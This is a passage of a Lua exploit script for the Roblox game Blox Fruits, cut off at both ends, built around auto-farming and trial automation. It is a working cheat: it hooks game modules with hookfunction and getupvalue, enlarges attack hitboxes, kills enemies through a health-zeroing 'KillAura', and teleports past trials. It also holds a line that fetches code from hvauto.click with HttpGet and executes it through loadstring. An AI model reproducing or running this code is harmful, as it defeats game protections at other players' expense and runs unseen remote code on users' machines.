        end
    end


    function equipweapon(aq)
        local c6 = tostring(aq)
        local c7 = game.Players.LocalPlayer.Backpack:FindFirstChild(c6)
        local c8 =
            game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") or
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
        if c7 then
            c8:EquipTool(c7)
        end
    end

    function NameMelee()
        for r, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
            if v:IsA("Tool") and v.ToolTip == "Melee" then
                return v.Name
            end
        end
        for r, v in next, game:GetService("Players").LocalPlayer.Character:GetChildren() do
            if v:IsA("Tool") and v.ToolTip == "Melee" then
                return v.Name
            end
        end
    end

    function checkskillMelee()
        if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(NameMelee()) then
            equipweapon(NameMelee())
            return false
        end
        for r, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[NameMelee()]:GetChildren() do
            if v:IsA("Frame") then
                if
                    v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                    v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                    v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
                then
                    return v.Name
                end
            end
        end
    end

    function checkskillDF()
        if
            not game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(
                game:GetService("Players").LocalPlayer.Data.DevilFruit.Value
            )
        then
            equipweapon(game:GetService("Players").LocalPlayer.Data.DevilFruit.Value)
            return false
        end
        for r, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[
        game:GetService("Players").LocalPlayer.Data.DevilFruit.Value
        ]:GetChildren() do
            if v:IsA("Frame") then
                if
                    v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                    v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                    v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
                then
                    return v.Name
                end
            end
        end
    end

    function NameSword()
        for r, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
            if v:IsA("Tool") and v.ToolTip == "Sword" then
                return v.Name
            end
        end
        for r, v in next, game:GetService("Players").LocalPlayer.Character:GetChildren() do
            if v:IsA("Tool") and v.ToolTip == "Sword" then
                return v.Name
            end
        end
    end

    function checkskillSword()
        if not NameSword() then
            return
        end
        if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(NameSword()) then
            equipweapon(NameSword())
            return false
        end
        for r, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[NameSword()]:GetChildren() do
            if v:IsA("Frame") then
                if
                    v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                    v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                    v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
                then
                    return v.Name
                end
            end
        end
    end

    function NameGun()
        dick = game.Players.LocalPlayer.Backpack or game.Players.LocalPlayer.Character
        for r, v in pairs(dick:GetChildren()) do
            if v:IsA("Tool") and v.ToolTip == "Gun" then
                return v.Name
            end
        end
    end

    function checkskillGun()
        if not NameGun() then
            return nil
        end
        if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(NameGun()) then
            equipweapon(NameGun())
            return false
        end
        for r, v in next, game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills[NameGun()]:GetChildren() do
            if v:IsA("Frame") then
                if
                    v.Name ~= "Template" and v.Title.TextColor3 == Color3.new(1, 1, 1) and
                    v.Cooldown.Size == UDim2.new(0, 0, 1, -1) or
                    v.Cooldown.Size == UDim2.new(1, 0, 1, -1)
                then
                    return v.Name
                end
            end
        end
    end



    function autoskill()
        EnableBuso()
        sword = checkskillSword()
        meele = checkskillMelee()
        df = checkskillDF()
        gun = checkskillGun()
        if
            df and not string.find(game:GetService("Players").LocalPlayer.Data.DevilFruit.Value, "Portal") and
            df ~= "F"
        then
            EquipWeaponName(game:GetService("Players").LocalPlayer.Data.DevilFruit.Value)
            local condimebeo = checkskillDF()
            if condimebeo then
                SendKey(condimebeo)
            end
        elseif checkskillMelee() then
            EquipWeaponName(NameMelee())
            local condimebeo = checkskillMelee()
            if condimebeo then
                SendKey(condimebeo)
            end
        elseif checkskillSword() then
            EquipWeaponName(NameSword())
            local condimebeo = checkskillSword()
            if condimebeo then
                SendKey(condimebeo)
            end
        elseif checkskillGun() then
            EquipWeaponName(NameGun())
            local condimebeo = checkskillGun()
            if condimebeo then
                SendKey(condimebeo)
            end
        else
            EquipAllWeapon()
        end
    end

    function spammelle()
    if checkskillMelee() then
            EquipWeaponName(NameMelee())
            local condimebeo = checkskillMelee()
            if condimebeo then
                SendKey(condimebeo)
            end
    end
    end


    spawn(function()
        while wait() do
            if autospamskillmelee then
                spammelle()
            end
        end
    end)

    spawn(function()
        while wait() do
            if autospamskill then
                autoskill()
            end
        end
    end)


    spawn(function()
        while wait() do
            if Config.Trial then
                if not checkistrial() and (game:GetService("Workspace").Map["Temple of Time"][game.Players.LocalPlayer.Data.Race.Value .. "Corridor"].Door.WorldPivot.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 30 then
                    Tweento(game:GetService("Workspace").Map["Temple of Time"]
                        [game.Players.LocalPlayer.Data.Race.Value .. "Corridor"]
                        .Door.WorldPivot)
                end
            end
        end
    end)

    SeaBeastTrial = false
    task.spawn(
        function()
            while wait() do
                if Config.Trial then
                    if checkmaptrial() == "Fish Trial" then
                        SeaBeastTrial = true
                        if checkistrial() then
                                    Stats_Melee = game:GetService("Players").LocalPlayer.Data.Stats.Melee.Level.Value
                                    Stats_DF = game:GetService("Players").LocalPlayer.Data.Stats["Demon Fruit"].Level.Value      
                                    Stats_Gun = game:GetService("Players").LocalPlayer.Data.Stats.Gun.Level.Value
                                    Stats_Sword = game:GetService("Players").LocalPlayer.Data.Stats.Sword.Level.Value
                            spawn(TeleportSeabeast(GetSeaBeastTrial()), 1)
                            getgenv().psskill = GetSeaBeastTrial().HumanoidRootPart.CFrame
                            autospamskill = true
                        else
                            getgenv().psskill = nil
                            autospamskill = false
                        end
                    else
                        getgenv().psskill = nil
                        autospamskill = false
                    end
                end
            end
        end
    )


    function KillAura()
        for i,v in pairs(game.Workspace.Enemies:GetChildren()) do 
            pcall(function()
                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                v.Humanoid.Health = 0
            end)
        end
    end
    spawn(function()
        while wait() do
            if (checkmaptrial() == "Ghoul Trial" or checkmaptrial() == "Human Trial") and checkistrial() and Config.Trial then
                for i, v in pairs(workspace.Enemies:GetChildren()) do
                    Tweento(v.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0))
                    repeat
                        spawn(function()
                            Tweento(v.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0))
                        end)
                        spawn(function()
                            KillAura()
                        end)
                    until not v or not v:FindFirstChild("HumanoidRootPart") or not v:FindFirstChild("Humanoid") or v.Humanoid.Health <= 0 or not checkistrial() or not Config.Trial
                end
            end
        end
    end)
    spawn(function()
        while wait() do
            if checkmaptrial() == "Mink Trial" and checkistrial() and Config.Trial then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").StartPoint.CFrame
            end
        end
    end)
    spawn(function()
        while wait() do
            if checkmaptrial() == "Sky Trial" and checkistrial() and Config.Trial then
                Tweento(game:GetService("Workspace").Map.SkyTrial.Model.FinishPart.CFrame)
            end
        end
    end)
    spawn(function()
        while wait() do
            if checkmaptrial() == "Cyborg Trial" and checkistrial() and Config.Trial then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-20013.2402, 10090.5332,
                    -17.1017056, -0.697729588, 2.21663612e-08, -0.716361225, 4.15089296e-08, 1, -9.48634149e-09,
                    0.716361225, -3.63542902e-08, -0.697729588)
            end
        end
    end)


    spawn(function()
        while wait() do
            if Config.Reset then
                local v51, v52 = game.ReplicatedStorage.Remotes.Temple.OnClientEvent:Wait()
                print(v51,v52)
                print("Checked")
                if v51 == "Start" and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - workspace.Map["Temple of Time"].SpawnRoom.WorldPivot.Position).Magnitude <= 3000 then
                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
                end
            end
        end
    end)

    if game.PlaceId == 7449423635 then
        for v3, v4 in pairs(workspace.Map["Temple of Time"].Murals:GetChildren()) do
            v4:GetAttributeChangedSignal("Activated"):Connect(function()
                if v4:GetAttribute("Activated") then
                    print(v4.Name .. "Enabled")
                else
                    print(print(v4.Name .. "Disabled"))
                end
            end);
        end;
        end
        getgenv().PlayerActivingV3Count = 0
    function count()
        local function CheckV3(v)
            local Root = v.PrimaryPart or v:WaitForChild('HumanoidRootPart')
            if Root then 
                Root.ChildAdded:Connect(function(v2)
                    if v2.Name == 'ActivationRing' and v.Name ~= game.Players.LocalPlayer.Name and (v.HumanoidRootPart.Position - workspace.Map["Temple of Time"].SpawnRoom.WorldPivot.Position).Magnitude <= 3000 then 
                        print(v.Name," bat toc v3")
                        getgenv().PlayerActivingV3Count = getgenv().PlayerActivingV3Count +1
                        task.delay(4.5,function()
                            print(v.Name,"tat toc v3")
                            getgenv().PlayerActivingV3Count = getgenv().PlayerActivingV3Count -1  
                            end)  
                    end
                end)
            end
        end 
        for i,v in pairs(workspace.Characters:GetChildren()) do 
            CheckV3(v)
        end
        game.workspace.Characters.ChildAdded:Connect(CheckV3)
    end 
    if Sea3 then
    count()
    end
    print("Loaded Check V3 Race V4 functions")
    spawn(function()
        while wait() do
            if getgenv().PlayerActivingV3Count >= tonumber(Config.MinPlayer) and Config.Trial then
                game:service("VirtualInputManager"):SendKeyEvent(true, "T", false, game)
                task.wait()
                game:service("VirtualInputManager"):SendKeyEvent(false, "T", false, game)
            end
        end
    end)

    local name = {
        "Reborn Skeleton",
        "Living Zombie",
        "Demonic Soul",
        "Posessed Mummy" }

        spawn(function()
            while wait() do
                if Config.QAO then
                    if string.find(CheckAcientOneStatus(),"train") or string.find(CheckAcientOneStatus(),"Train") then 
                    KillMobList(name)
                    spawn(function()
                        if
                            game.Players.LocalPlayer.Character:FindFirstChild("RaceEnergy") and
                            game.Players.LocalPlayer.Character.RaceEnergy.Value >= 1 and
                            not game.Players.LocalPlayer.Character.RaceTransformed.Value
                        then
                            local be = game:service("VirtualInputManager")
                            be:SendKeyEvent(true, "Y", false, game)
                            task.wait()
                            be:SendKeyEvent(false, "Y", false, game)
                        end
                    end)
                else
                    TweentoCurrentRaceDoor()
                end
            end
        end
    end                 
        )                       
                    



    ------------------Stats
    local GayStat = Tabs.Mics:AddDropdown("GayStat", {
        Title = "Auto Stats",
        Values = {'Melee','Sword', 'Demon Fruit','Defense'},
        Multi = false,
    })

    GayStat:OnChanged(function(Value)
        getgenv().StatsGay = Value
        print(getgenv().StatsGay)
    end)


    Tabs.Mics:AddToggle("Auto Farm",
    {
        Title = "Auto Random Fruit",
        Default = Settingss.AutoRandom,
        Callback = function(v)
            Config.AutoRandom = v
            Save("AutoRandom", v)
        end
    })


    local function FireAddPoint(PointName,num) 
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AddPoint",PointName,num)
    end

    coroutine.wrap(function()
        while wait() do
            local MaxLevel = 2550 
            local Stats_Melee = game:GetService("Players").LocalPlayer.Data.Stats.Melee.Level.Value  
            local Stats_Def = game:GetService("Players").LocalPlayer.Data.Stats['Defense'].Level.Value
            local Stats_DF = game:GetService("Players").LocalPlayer.Data.Stats["Demon Fruit"].Level.Value 
            local Stats_Gun = game:GetService("Players").LocalPlayer.Data.Stats.Gun.Level.Value 
            local Stats_Sword = game:GetService("Players").LocalPlayer.Data.Stats.Sword.Level.Value   
            if Stats_Melee < MaxLevel and getgenv().StatsGay == 'Melee' then 
                FireAddPoint('Melee',MaxLevel-Stats_Melee)
            elseif Stats_Def < 2550 and getgenv().StatsGay == 'Defense' then 
                FireAddPoint('Defense',MaxLevel-Stats_Def)
                        elseif Stats_DF < 2550 and getgenv().StatsGay == 'Demon Fruit' then 
                FireAddPoint('Demon Fruit',MaxLevel-Stats_DF)
                        elseif Stats_Sword < 2550 and getgenv().StatsGay == 'Sword' then 
                FireAddPoint('Sword',MaxLevel-Stats_Sword)
            end
        end
        end)()
        


    --and not checkgatcan2()



    spawn(function()
        while wait() do
            time:SetDesc(game:GetService("Lighting").TimeOfDay)
            acient:SetDesc(tostring(CheckAcientOneStatus()))
            player:SetDesc(game.Players.NumPlayers .. "/" .. game.Players.MaxPlayers)
            ccgaycc:SetDesc(humm())
            MoonStatus:SetDesc(getfm())
            MirageStatus:SetDesc(getmirage())
        end
    end)
    function checkgatcan2()
        if game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("CheckTempleDoor") then
            return true
        else
            return false
        end
    end
    --farm

    repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer 
local lasttis = 0 
local JoinedGame = tick() 
getgenv().MeleeWait = ''
SetContent = function(v1,delayticks)
    if not v1 then v1 = '' end 
    if tick()-lasttis > 0 then
        if not getgenv().CurrentTask then 
            getgenv().CurrentTask = ''
        end 
        if not getgenv().MeleeWait then 
            getgenv().MeleeWait = '' 
        end 
        local aSet1 = getgenv().CurrentTask
        if getgenv().MeleeTask and getgenv().MeleeTask ~= '' and getgenv().MeleeTask ~='None' then 
            aSet1 = getgenv().MeleeTask
        end
        if ContentSet then ContentSet(v1,tostring(aSet1),tostring(getgenv().MeleeWait)) end
    end 
    if delayticks then 
        lasttis = tick()+delayticks
    end
end  
SetMeleeWait = function(v1Name,v1Value)
    getgenv().MeleeWait = " | Waitting "..tostring(v1Name).." hit "..tostring(v1Value).." mastery." 
end
getgenv().ServerData = {} 
function Join(v2) 
    v2 = tostring(v2) or "Pirates"
    v2 = string.find(v2,"Marine") and "Marines" or "Pirates"
    for i, v in pairs(
        getconnections(
            game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container[v2].Frame.TextButton.Activated
        )
    ) do
        v.Function()
    end
end
if not game.Players.LocalPlayer.Team then 
    repeat
        pcall(
            function()
                task.wait()
                if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main"):FindFirstChild("ChooseTeam") then 
                    Join(getgenv().Team)
                end
            end
        )
    until game.Players.LocalPlayer.Team ~= nil 
end
local RunService= game:GetService("RunService")
function RemoveLevelTitle(v)
    return tostring(tostring(v):gsub(" %pLv. %d+%p", ""):gsub(" %pRaid Boss%p", ""):gsub(" %pBoss%p", ""))
end 
if game.Workspace:FindFirstChild("MobSpawns") then
    for i, v in pairs(game.Workspace:GetChildren()) do
        if v.Name == "MobSpawns" then
            v:Destroy()
        end
    end
end
---
task.spawn(function()
    if hookfunction and not islclosure(hookfunction) then 
        for i,v in pairs(game.ReplicatedStorage.Assets.GUI:GetChildren()) do 
            v.Enabled = false 
        end
        hookfunction(require(game:GetService("ReplicatedStorage").Effect.Container.Death), function()end)
        hookfunction(require(game:GetService("ReplicatedStorage").Effect.Container.Respawn), function()end)
        abc = true
        task.spawn(function()
            local a = game.Players.LocalPlayer
            local b = require(a.PlayerScripts.CombatFramework.Particle)
            local c = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib)
            if not shared.orl then
                shared.orl = c.wrapAttackAnimationAsync
            end
            if not shared.cpc then
                shared.cpc = b.play
            end
            if abc then
                pcall(function()
                    c.wrapAttackAnimationAsync = function(d, e, f, g, h)
                        local i = c.getBladeHits(e, f, g)
                        if i then
                            b.play = function()
                            end
                            d:Play(1, 1, 0.001)
                            h(i)
                            b.play = shared.cpc
                            wait(.5)
                            d:Stop()
                        end
                    end
                end)
            end
        end)
        task.delay(10,function()
            for i,v2 in pairs(game.ReplicatedStorage.Effect.Container:GetDescendants()) do 
                pcall(function()
                    if v2.ClassName =='ModuleScript' and typeof(require(v2)) == 'function' then 
                        hookfunction(require(v2),function()end)
                    end
                end)
            end
        end)
    end
    
    local old = require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework)
    local com = getupvalue(old, 2)
    require(game.ReplicatedStorage.Util.CameraShaker):Stop()
    spawn(
        function()
            game:GetService("RunService").Stepped:Connect(
                function()
                    pcall(
                        function()
                            com.activeController.hitboxMagnitude = 60
                            if getgenv().UseFAttack or _G.AttackConfig["Fast Attack Aura"] then
                                com.activeController.hitboxMagnitude = 60
                                com.activeController.active = false
                                com.activeController.blocking = false
                                com.activeController.focusStart = 0
                                com.activeController.hitSound = nil
                                com.activeController.increment = 0
                                com.activeController.timeToNextAttack = 0   
                                com.activeController.timeToNextBlock = 0
                                com.activeController:attack()
                            end
                        end
                    )
                end
            )
        end
    )
    
end)
----
loadstring(game:HttpGet('https://hvauto.click/raw/KaitunHop'))()
function GetDistance(target1, taget2)
    if not taget2 then
        taget2 = game.Players.LocalPlayer.Character.HumanoidRootPart
    end
    local bbos, bbos2 =
        pcall(
        function()
            a = target1.Position
            a2 = taget2.Position
        end
    )
    if bbos then
        return (a - a2).Magnitude
    end
end 

local MobSpawnsFolder = Instance.new("Folder")
MobSpawnsFolder.Parent = game.Workspace
MobSpawnsFolder.Name = "MobSpawns"
MobSpawnsFolder.ChildAdded:Connect(function(v)
    wait(1)
    v.Name = RemoveLevelTitle(v.Name)
end)
local AllMobInGame = {}
for i, v in next, require(game:GetService("ReplicatedStorage").Quests) do
    for i1, v1 in next, v do
        for i2, v2 in next, v1.Task do
            if v2 > 1 then
                table.insert(AllMobInGame, i2)
            end
        end
    end
end
local MobOutFolder = {}
for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()) do
    v.Name = RemoveLevelTitle(v.Name)
    table.insert(MobOutFolder, v)
end
for i, v in pairs(getnilinstances()) do
    if table.find(AllMobInGame, RemoveLevelTitle(v.Name)) then
        table.insert(MobOutFolder, v)
    end
end
local l1 = {}
function ReCreateMobFolder()
    local MobNew
    l1 = {}
    for i,v in pairs(MobOutFolder) do 
        if v then
            pcall(function()
                if v:IsA("Model") and v:FindFirstChild("HumanoidRootPart") then
                    MobNew = Instance.new("Part")
                    MobNew.CFrame = v.PrimaryPart.CFrame
                    MobNew.Name = v.Name
                    MobNew.Parent = game.Workspace.MobSpawns
                elseif v:IsA("Part") then
                    MobNew = v:Clone()
                    MobNew.Parent = game.Workspace.MobSpawns
                    MobNew.Transparency = 1
                end
                if not table.find(l1,v.Name) then 
                    table.insert(l1,tostring(v.Name))
                end 
            end)
        end
    end
    warn('Created: '..tostring(#game.Workspace.MobSpawns:GetChildren()).." ("..tostring(#l1).."/"..#AllMobInGame..") Mob Spawns")
end
ReCreateMobFolder()
local MobSpawnClone = {}
local function getMid(vName,gg)
    local total = 0
    local allplus 
    for i,v in pairs(gg) do
        if v.Name == vName then 
            if not allplus then 
                allplus = v.Position
            else
                allplus = allplus+v.Position 
            end
            total = total+1
        end
    end
    if allplus then return allplus/total end 
end
local lss = 0
for i,v in pairs(game.Workspace.MobSpawns:GetChildren()) do 
    if not MobSpawnClone[v.Name] then 
        MobSpawnClone[v.Name] = CFrame.new(getMid(v.Name,game.Workspace.MobSpawns:GetChildren()))
        lss = lss +1
    end 
end
warn('Loaded total',lss,' mobs middle spawns')
getgenv().MobSpawnClone = MobSpawnClone
function GetMobSpawnList(a)
    local a = RemoveLevelTitle(a)
    k = {}
    for i, v in pairs(game.Workspace.MobSpawns:GetChildren()) do
        if v.Name == a then
            table.insert(k, v)
        end
    end
    return k
end

local BlackListLocation = {}
function CheckNearestTeleporter(vcs)
    vcspos = vcs.Position
    min = math.huge
    min2 = math.huge
    local placeId = game.PlaceId
    if placeId == 2753915549 then
        OldWorld = true
    elseif placeId == 4442272183 then
        NewWorld = true
    elseif placeId == 7449423635 then
        ThreeWorld = true
    end
    local chooseis
    if ThreeWorld then
        TableLocations = {
            ["Caslte On The Sea"] = Vector3.new(-5058.77490234375, 314.5155029296875, -3155.88330078125),
            ["Hydra"] = Vector3.new(5756.83740234375, 610.4240112304688, -253.9253692626953),
            ["Mansion"] = Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125),
            ["Great Tree"] = Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586),
            ["Ngu1"] = Vector3.new(-11993.580078125, 334.7812805175781, -8844.1826171875),
            ["ngu2"] = Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656),
            ["Temple Of Time"] = Vector3.new(2957.833740234375, 2286.495361328125, -7217.05078125)
        }
    elseif NewWorld then
        TableLocations = {
            ["Mansion"] = Vector3.new(-288.46246337890625, 306.130615234375, 597.9988403320312),
            ["Flamingo"] = Vector3.new(2284.912109375, 15.152046203613281, 905.48291015625),
            ["122"] = Vector3.new(923.21252441406, 126.9760055542, 32852.83203125),
            ["3032"] = Vector3.new(-6508.5581054688, 89.034996032715, -132.83953857422)
        }
    elseif OldWorld then
        TableLocations = {
            ["1"] = Vector3.new(-7894.6201171875, 5545.49169921875, -380.2467346191406),
            ["2"] = Vector3.new(-4607.82275390625, 872.5422973632812, -1667.556884765625),
            ["3"] = Vector3.new(61163.8515625, 11.759522438049316, 1819.7841796875),
            ["4"] = Vector3.new(3876.280517578125, 35.10614013671875, -1939.3201904296875)
        }
    end
    local mmbb = {}
    for i2, v2 in pairs(TableLocations) do
        if not table.find(BlackListLocation, i2) then
            mmbb[i2] = v2
        end
    end
    local TableLocations = mmbb
    local TableLocations2 = {}
    for i, v in pairs(TableLocations) do
        if typeof(v) ~= "table" then
            TableLocations2[i] = (v - vcspos).Magnitude
        else
            TableLocations2[i] = (v["POS"] - vcspos).Magnitude
        end
    end
    for i, v in pairs(TableLocations2) do
        if v < min then
            min = v
            min2 = v
        end
    end
    for i, v in pairs(TableLocations2) do
        if v < min then
            min = v
            min2 = v
        end
    end
    for i, v in pairs(TableLocations2) do
        if v <= min then
            choose = TableLocations[i]
            chooseis = i
        end
    end
    min3 = (vcspos - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    if min2 + 100 <= min3 then
        return choose, chooseis
    end
end
function requestEntrance(vector3, fr)
    if not fr or fr ~= "Temple Of Time" and fr ~= "Dismension" then
        args = {
            "requestEntrance",
            vector3
        }
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
        oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        char = game.Players.LocalPlayer.Character.HumanoidRootPart
        char.CFrame = CFrame.new(oldcframe.X, oldcframe.Y + 50, oldcframe.Z)
        task.wait(0.5)
    else
        pcall(
            function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                    "requestEntrance",
                    Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586)
                )
                if GetDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 10 then
                    return
                end
                game.Players.LocalPlayer.Character:MoveTo(
                    CFrame.new(
                        28390.7812,
                        14895.8574,
                        106.534714,
                        0.0683786646,
                        1.44424162e-08,
                        -0.997659445,
                        7.52342522e-10,
                        1,
                        1.45278642e-08,
                        0.997659445,
                        -1.74397752e-09,
                        0.0683786646
                    ).Position
                )
                AllNPCS = getnilinstances()
                for i, v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
                    table.insert(AllNPCS, v)
                end
                for i, v in pairs(AllNPCS) do
                    if v.Name == "Mysterious Force" then
                        TempleMysteriousNPC1 = v
                    end
                    if v.Name == "Mysterious Force3" then
                        TempleMysteriousNPC2 = v
                    end
                end
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    TempleMysteriousNPC2.HumanoidRootPart.CFrame
                wait(0.3)
                if
                    (TempleMysteriousNPC2.HumanoidRootPart.Position -
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 15
                 then
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "TeleportBack")
                end
                wait(0.75)
            end
        )
    end
end
function AntiLowHealth(NewY)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
        CFrame.new(
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
        NewY,
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
    )
    wait()
end
function GetMidPoint(MobName, b2)
    if MobName == "Ship Officer [Lv. 1325]" then
        return b2.CFrame
    end
    if 1 > 1 then
        return b2.CFrame
    end
    local totalpos
    allid = 0
    for i, v in pairs(game.workspace.Enemies:GetChildren()) do
        if
            v.Name == MobName and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v:FindFirstChild("HumanoidRootPart") and
                (b2 and GetDistance(v.HumanoidRootPart, b2) <= 475)
         then
            if not totalpos then
                totalpos = v.HumanoidRootPart.Position
            elseif totalpos then
                totalpos = totalpos + v.HumanoidRootPart.Position
            end
            allid = allid + 1
        end
    end
    if totalpos then
        return totalpos / allid
    end
end 
function TweenObject(TweenCFrame,obj,ts)
    if not ts then ts = 350 end
    local tween_s = game:service "TweenService"
    local info =
        TweenInfo.new(
        (TweenCFrame.Position -
            obj.Position).Magnitude /
            ts,
        Enum.EasingStyle.Linear
    )
    getgenv().TweenObject =
        tween_s:Create(
            obj,
        info,
        {CFrame = TweenCFrame}
    )
    getgenv().TweenObject:Play() 
end
function IsPlayerAlive(player)
    if not player then
        player = game.Players.LocalPlayer
    end

    -- Kiểm tra xem đối tượng player có tồn tại và là một người chơi hợp lệ không
    if not player or not player:IsA("Player") then
        return false -- Trả về false nếu không phải là người chơi
    end

    -- Kiểm tra trạng thái nhân vật của người chơi
    local character = player.Character or player:FindFirstChild('Character')
    if not character then
        return false -- Trả về false nếu không có nhân vật
    end

    -- Kiểm tra thanh máu của nhân vật (Humanoid)
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then
        return false -- Trả về false nếu không có Humanoid hoặc máu bằng 0
    end

    -- Nếu tất cả các điều kiện trên đều thỏa mãn, người chơi còn sống
    return true 
end
function CheckPlayerAlive()
    local a2,b2 = pcall(function() return game:GetService("Players").LocalPlayer.Character.Humanoid.Health > 0 end)
    task.wait()
    if a2 then return b2 end 
end   
local FruitStocks = {}
for i,v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
    "GetFruits",
    game:GetService("Players").LocalPlayer.PlayerGui.Main.FruitShop:GetAttribute("Shop2")
)) do 
    if v.OnSale then 
        table.insert(FruitStocks,v.Name)
    end
end
function SnipeFruit(fruitsSnipes)
    if getgenv().ServerData['PlayerData'].DevilFruit == '' then 
        for i = #fruitsSnipes,1,1 do 
            local f = fruitsSnipes[i]
            if FruitStocks[f] then 
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseRawFruit", f, game:GetService("Players").LocalPlayer.PlayerGui.Main.FruitShop:GetAttribute("Shop2"))
                return 
            end
        end  
    end
end   
function sortSwordsByRarity(swords)
    table.sort(swords, function(a, b)
        return a.Rarity > b.Rarity
    end) 
    return swords[1]
end

function getNextSwordToFarm()
    local Swords = {}
    for _, itemData in pairs(getgenv().ServerData["Inventory Items"]) do 
        if itemData.Type == 'Sword' and itemData.Mastery < itemData.MasteryRequirements.X then 
            table.insert(Swords, itemData)  -- Chèn đúng vào bảng Swords
        end 
    end
    if #Swords > 0 then 
        local NNN = sortSwordsByRarity(Swords) 
        return NNN,NNN.MasteryRequirements.X
    end
    --[[
    Swords = {}
    for _, itemData in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do 
    if itemData.Type == 'Sword' and itemData.Mastery < 600 then 
        table.insert(Swords, itemData)  -- Chèn đúng vào bảng Swords
    end 
    end
    if #Swords > 0 then 
    local NNN = sortSwordsByRarity(Swords) 
    return NNN,NNN.MasteryRequirements.X
    end
    ]]
    return nil,0
end  

function checkFruit1MWS()
    for i,v in pairs(game.workspace:GetChildren()) do 
        if v.Name:find('Fruit') and getPriceFruit(ReturnFruitNameWithId(v)) >= 1000000 then 
            return v 
        end 
    end
end
function checkFruit1M(in5)
    local function fruitsea3bp()
        local n3
        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do 
            if v.Name:find('Fruit') and getPriceFruit(ReturnFruitNameWithId(v)) >= 1000000 then 
                n3 = v 
            end 
        end 
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
            if v.Name:find('Fruit') and getPriceFruit(ReturnFruitNameWithId(v)) >= 1000000 then 
                n3 = v 
            end 
        end 
        return n3 
    end 
    if fruitsea3bp() then return fruitsea3bp() end
    if in5 then  
        local FOUNDDF 
        local MaxValue = math.huge 
        for i,v in pairs(getgenv().ServerData["Inventory Items"]) do 
            if v.Value and v.Value >= 1000000 and v.Value < MaxValue then   
                MaxValue = v.Value 
                FOUNDDF = v.Name
            end
        end 
        if FOUNDDF then 
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", FOUNDDF) 
            wait(.5)
            if fruitsea3bp() then return fruitsea3bp() end
        end
    end 
end
function checkFruittoEat(fruitsSnipes,includedInventory)
    for i,v in pairs(fruitsSnipes) do 
        local OC = tostring(v):split('-')
        local OC333 = ""
        if #OC >= 3 then 
            local OC2 = {} 
            for i,v in pairs(OC) do 
                table.insert(OC2,v)
                if #OC2 >= #OC/2 then break end 
            end
            OC333 = unpack(OC2)
        else
            OC333 = OC[1]
        end
        if getgenv().ServerData['PlayerBackpack'][OC333.." Fruit"] then 
            return true 
        end
    end 
    if includedInventory then 
        for i,v in pairs(fruitsSnipes) do 
            if getgenv().ServerData["Inventory Items"][v] then 
                return true
            end
        end
    end
end 
function eatFruit(fruitsSnipes,includedInventory) 
    function l4432()
        for i,v in pairs(fruitsSnipes) do 
            local OC = tostring(v):split('-')
